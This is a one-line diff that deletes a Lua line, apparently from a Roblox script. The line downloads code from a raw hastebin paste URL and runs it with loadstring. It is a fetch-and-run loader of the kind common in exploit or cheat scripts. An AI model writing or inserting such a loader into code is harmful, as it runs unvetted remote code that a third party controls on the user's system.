@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://hastebin.com/raw/figagijixu.md'),true))()
